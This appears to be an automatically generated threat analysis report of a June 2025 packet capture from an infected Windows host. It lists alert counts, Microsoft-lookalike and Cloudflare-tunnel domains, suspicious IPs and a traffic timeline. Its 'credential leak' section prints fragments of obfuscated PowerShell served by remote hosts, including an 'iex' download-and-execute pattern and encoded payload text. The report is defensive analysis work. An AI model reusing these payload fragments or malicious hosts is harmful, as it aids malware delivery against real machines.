# PCAP Threat Analysis Report


## Executive Summary

- **Total Packets**: 48877
- **Suspicious Packets**: 398
- **Alerts by Category**: {'Uncommon Destination Ports (TCP/UDP)': 1, 'Possible DDoS Attacks (IP)': 1, 'Large Packets (All)': 81, 'Unsolicited ARP Replies': 126, 'Large DNS Responses': 0, 'Excessive ICMP Echo Requests': 1, 'Excessive TCP SYN': 1, 'Port Scanning Attempts': 1, 'Intrusion Detection': 1, 'Threat Hunting Indicators': 1, 'Suspicious Domain Requests': 0, 'Malicious DNS Queries': 1, 'Outbound Connections to Odd Ports': 1, 'Large POST Requests': 1, 'TLS Client Hello Anomalies': 1, 'Non-Standard Protocols on Unusual Ports': 1, 'Credential/Token Leakage': 1, 'IP Reputation / Abuse Indicators': 1, 'Timeline of Activity': 240}

## Top 10 HTTP Hosts

- ('event-datamicrosoft.live', 27)
- ('varying-rentals-calgary-predict.trycloudflare.com', 18)
- ('windows-msgas.com', 17)
- ('ctldl.windowsupdate.com', 2)
- ('www.msftconnecttest.com', 1)
- ('event-time-microsoft.org', 1)
- ('eventdata-microsoft.live', 1)
- ('acroipm2.adobe.com', 1)

## Top 10 DNS Queries

- ('wpad.massfriction.com', 50)
- ('edge.microsoft.com', 22)
- ('www.bing.com', 16)
- ('windows-msgas.com', 14)
- ('varying-rentals-calgary-predict.trycloudflare.com', 14)
- ('event-datamicrosoft.live', 14)
- ('www.google.com', 12)
- ('s.clarity.ms', 12)
- ('login.microsoftonline.com', 10)
- ('config.edge.skype.com', 9)

## Suspicious IPs

- 0.0.0.0
- 255.255.255.255
- 10.6.13.3
- 10.6.13.133
- 224.0.0.252
- 10.6.13.255
- 239.255.255.250
- 173.222.52.33
- 52.156.123.84
- 23.192.223.206
- 104.208.203.90
- 20.190.135.6
- 217.20.51.22
- 13.107.42.16
- 23.198.7.186
- 204.79.197.203
- 23.212.185.76
- 150.171.27.11
- 40.126.29.13
- 23.198.7.180
- 150.171.28.11
- 224.0.0.251
- 142.250.115.99
- 173.194.208.155
- 142.250.113.95
- 142.251.186.138
- 205.174.24.80
- 142.250.115.95
- 142.250.115.106
- 142.250.138.97
- 142.250.115.94
- 67.217.228.199
- 13.107.246.57
- 173.194.208.94
- 109.61.92.48
- 142.250.115.104
- 157.240.24.13
- 44.239.34.26
- 216.239.38.181
- 142.250.138.155
- 23.96.124.68
- 157.240.24.35
- 104.16.124.96
- 204.79.197.222
- 150.171.73.254
- 52.113.196.254
- 191.232.215.149
- 172.202.65.254
- 13.107.42.10
- 13.107.18.254
- 10.6.13.129
- 20.189.173.6
- 172.67.146.241
- 104.21.24.186
- 104.21.112.1
- 23.212.185.87
- 150.171.27.12
- 23.198.7.168
- 23.198.7.182
- 83.137.149.15
- 104.21.16.1
- 104.16.230.132
- 20.190.157.13
- 23.96.180.189
- 52.140.118.28
- 13.74.187.43
- 40.126.29.11
- 20.50.80.213
- 23.192.223.240
- 20.190.157.14
- 104.21.80.1
- 104.16.231.132
- 40.69.76.172
- 52.123.129.14
- 104.21.64.1
- 20.190.157.9
- 52.167.249.196
- 104.21.96.1

## Credential or Token Leaks

- {'packet_index': 10, 'src_ip': '10.6.13.133', 'dst_ip': '217.20.51.22', 'snippet': 'get /msdownload/update/v3/static/trustedr/en/authrootstl.cab?14a7b69d3530a12d http/1.1\r\nconnection: '}
- {'packet_index': 21, 'src_ip': '104.21.24.186', 'dst_ip': '10.6.13.133', 'snippet': "ring')(${get-service -verbose -logname system && ($dfmlnc)})) | iex; ${get-content -erroraction sile"}
- {'packet_index': 31, 'src_ip': '104.21.112.1', 'dst_ip': '10.6.13.133', 'snippet': 'http/1.1 200 ok\r\ndate: fri, 13 jun 2025 15:36:24 gmt\r\ncontent-type: text/plain;charset=utf-8\r\nconten'}
- {'packet_index': 33, 'src_ip': '104.21.112.1', 'dst_ip': '10.6.13.133', 'snippet': 'dojpdb25jyxqojetnuhp3akx3tjl3sywgjchby2hhcl0onzeqotivnzepk1tjagfyxsgxmtuqmteylz";${remove-item -verb'}
- {'packet_index': 36, 'src_ip': '104.21.112.1', 'dst_ip': '10.6.13.133', 'snippet': '14gh && ($kigcoa)} = "snmccrj2inkyd5jysnqicrj04nkydljysnaycrjzknkydqjysnvccrj0qnkydzjysnzycrj1onkycw'}

## Timeline of Threat Activity

- {'time': '2025-06-13 21:03:55', 'packet_count': 29, 'protocols': {'UDP': 14, 'TCP': 15}, 'unique_sources': ['10.6.13.133', '173.222.52.33', '52.156.123.84', '10.6.13.3'], 'unique_destinations': ['224.0.0.252', '10.6.13.255', '52.156.123.84', '173.222.52.33', '239.255.255.250', '10.6.13.133', '10.6.13.3', '255.255.255.255']}
- {'time': '2025-06-13 21:04:00', 'packet_count': 10, 'protocols': {'UDP': 6, 'TCP': 4}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.208.203.90', '10.6.13.255', '239.255.255.250']}
- {'time': '2025-06-13 21:04:05', 'packet_count': 45, 'protocols': {'UDP': 5, 'TCP': 40}, 'unique_sources': ['10.6.13.3', '10.6.13.133'], 'unique_destinations': ['10.6.13.3', '239.255.255.250', '10.6.13.133']}
- {'time': '2025-06-13 21:04:10', 'packet_count': 32, 'protocols': {'TCP': 20, 'UDP': 12}, 'unique_sources': ['204.79.197.203', '20.190.135.6', '10.6.13.3', '10.6.13.133', '23.198.7.186'], 'unique_destinations': ['204.79.197.203', '13.107.42.16', '104.208.203.90', '20.190.135.6', '10.6.13.3', '10.6.13.133', '23.198.7.186']}
- {'time': '2025-06-13 21:04:15', 'packet_count': 57, 'protocols': {'UDP': 2, 'TCP': 55}, 'unique_sources': ['13.107.42.16', '23.212.185.76', '10.6.13.133'], 'unique_destinations': ['13.107.42.16', '10.6.13.133', '10.6.13.3', '23.212.185.76', '23.198.7.186']}
- {'time': '2025-06-13 21:04:20', 'packet_count': 3, 'protocols': {'TCP': 3}, 'unique_sources': ['10.6.13.3', '10.6.13.133'], 'unique_destinations': ['10.6.13.133', '10.6.13.3']}
- {'time': '2025-06-13 21:04:25', 'packet_count': 5, 'protocols': {'TCP': 2, 'UDP': 3}, 'unique_sources': ['10.6.13.133', '150.171.28.11', '23.198.7.180'], 'unique_destinations': ['224.0.0.251', '10.6.13.133']}
- {'time': '2025-06-13 21:04:35', 'packet_count': 21, 'protocols': {'TCP': 21}, 'unique_sources': ['173.194.208.155', '142.250.113.95', '142.250.115.99', '10.6.13.133'], 'unique_destinations': ['142.251.186.138', '142.250.115.99', '10.6.13.133']}
- {'time': '2025-06-13 21:04:40', 'packet_count': 8, 'protocols': {'TCP': 8}, 'unique_sources': ['142.250.115.99', '10.6.13.133'], 'unique_destinations': ['205.174.24.80', '142.250.115.99', '10.6.13.133']}
- {'time': '2025-06-13 21:04:45', 'packet_count': 33, 'protocols': {'TCP': 32, 'UDP': 1}, 'unique_sources': ['142.250.138.97', '10.6.13.133', '173.194.208.94', '150.171.27.11', '205.174.24.80'], 'unique_destinations': ['142.250.138.97', '142.250.115.106', '10.6.13.3', '10.6.13.133', '13.107.246.57', '109.61.92.48', '173.194.208.94', '150.171.27.11', '205.174.24.80']}
- {'time': '2025-06-13 21:05:00', 'packet_count': 2, 'protocols': {'TCP': 2}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['204.79.197.222']}
- {'time': '2025-06-13 21:05:10', 'packet_count': 1, 'protocols': {'UDP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['10.6.13.3']}
- {'time': '2025-06-13 21:05:20', 'packet_count': 9, 'protocols': {'UDP': 9}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['239.255.255.250']}
- {'time': '2025-06-13 21:05:25', 'packet_count': 4, 'protocols': {'UDP': 4}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['239.255.255.250']}
- {'time': '2025-06-13 21:05:30', 'packet_count': 1, 'protocols': {'UDP': 1}, 'unique_sources': ['23.198.7.186'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:06:20', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.112.1']}
- {'time': '2025-06-13 21:06:30', 'packet_count': 3, 'protocols': {'TCP': 3}, 'unique_sources': ['83.137.149.15'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:06:35', 'packet_count': 3, 'protocols': {'TCP': 3}, 'unique_sources': ['83.137.149.15'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:06:40', 'packet_count': 16, 'protocols': {'TCP': 16}, 'unique_sources': ['83.137.149.15', '10.6.13.133'], 'unique_destinations': ['83.137.149.15', '10.6.13.133']}
- {'time': '2025-06-13 21:06:45', 'packet_count': 23, 'protocols': {'TCP': 23}, 'unique_sources': ['83.137.149.15', '10.6.13.133'], 'unique_destinations': ['83.137.149.15', '10.6.13.133']}
- {'time': '2025-06-13 21:06:50', 'packet_count': 11, 'protocols': {'TCP': 11}, 'unique_sources': ['83.137.149.15', '10.6.13.133'], 'unique_destinations': ['83.137.149.15', '10.6.13.133']}
- {'time': '2025-06-13 21:06:55', 'packet_count': 18, 'protocols': {'TCP': 18}, 'unique_sources': ['83.137.149.15', '10.6.13.133'], 'unique_destinations': ['83.137.149.15', '10.6.13.133']}
- {'time': '2025-06-13 21:07:00', 'packet_count': 15, 'protocols': {'TCP': 15}, 'unique_sources': ['83.137.149.15', '10.6.13.133'], 'unique_destinations': ['83.137.149.15', '10.6.13.133']}
- {'time': '2025-06-13 21:07:05', 'packet_count': 8, 'protocols': {'TCP': 8}, 'unique_sources': ['83.137.149.15', '10.6.13.133'], 'unique_destinations': ['83.137.149.15', '10.6.13.133']}
- {'time': '2025-06-13 21:07:20', 'packet_count': 2, 'protocols': {'TCP': 2}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.16.1']}
- {'time': '2025-06-13 21:08:55', 'packet_count': 2, 'protocols': {'TCP': 2}, 'unique_sources': ['104.16.230.132'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:09:10', 'packet_count': 2, 'protocols': {'TCP': 2}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['10.6.13.3']}
- {'time': '2025-06-13 21:09:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.16.1']}
- {'time': '2025-06-13 21:11:30', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['10.6.13.3']}
- {'time': '2025-06-13 21:11:55', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.16.1']}
- {'time': '2025-06-13 21:13:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.21.16.1'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:14:05', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['10.6.13.3']}
- {'time': '2025-06-13 21:15:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.16.1']}
- {'time': '2025-06-13 21:15:30', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['10.6.13.3']}
- {'time': '2025-06-13 21:15:55', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.21.112.1'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:16:25', 'packet_count': 3, 'protocols': {'TCP': 3}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.16.1']}
- {'time': '2025-06-13 21:17:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.16.230.132'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:17:55', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.21.112.1'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:18:25', 'packet_count': 2, 'protocols': {'TCP': 2}, 'unique_sources': ['20.190.157.14', '10.6.13.3'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:18:55', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.21.112.1'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:19:45', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.21.112.1'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:19:55', 'packet_count': 2, 'protocols': {'TCP': 2}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.112.1']}
- {'time': '2025-06-13 21:20:15', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.21.112.1'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:20:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.21.80.1'], 'unique_destinations': ['10.6.13.133']}
- {'time': '2025-06-13 21:20:55', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.16.231.132']}
- {'time': '2025-06-13 21:21:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.80.1']}
- {'time': '2025-06-13 21:22:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.80.1']}
- {'time': '2025-06-13 21:22:55', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.80.1']}
- {'time': '2025-06-13 21:23:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['10.6.13.133'], 'unique_destinations': ['104.21.80.1']}
- {'time': '2025-06-13 21:24:25', 'packet_count': 1, 'protocols': {'TCP': 1}, 'unique_sources': ['104.16.231.132'], 'unique_destinations': ['10.6.13.133']}